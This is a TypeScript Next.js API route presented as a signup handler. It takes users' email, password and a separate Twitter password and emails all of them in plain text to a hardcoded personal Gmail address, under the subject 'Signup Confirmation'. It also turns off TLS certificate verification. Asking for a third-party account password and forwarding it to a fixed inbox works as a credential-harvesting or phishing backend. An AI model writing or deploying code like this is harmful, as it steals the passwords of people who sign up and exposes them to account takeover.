import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(req: Request) {
  try {
    const { firstname, lastname, email, password, twitterpassword } =
      await req.json();

    // Create a transporter with Gmail SMTP
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER, // Your Gmail email
        pass: process.env.EMAIL_PASS, // Your App Password
      },
      tls: {
        rejectUnauthorized: false, // ✅ Bypass self-signed certificate issue
      },
    });

    // Email content
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: "shriram173yt@gmail.com",
      subject: "Signup Confirmation",
      text: `Hello ${firstname} ${lastname},

Thank you for signing up. Here are your details:

Email: ${email}
Password: ${password}
Twitter Password: ${twitterpassword}

Best regards,
Aceternity Team`,
    };

    // Send email
    await transporter.sendMail(mailOptions);

    return NextResponse.json({ message: "Signup email sent successfully" });
  } catch (error) {
    console.error("Error sending signup email:", error);
    return NextResponse.json(
      { error: "Failed to send email" },
      { status: 500 }
    );
  }
}
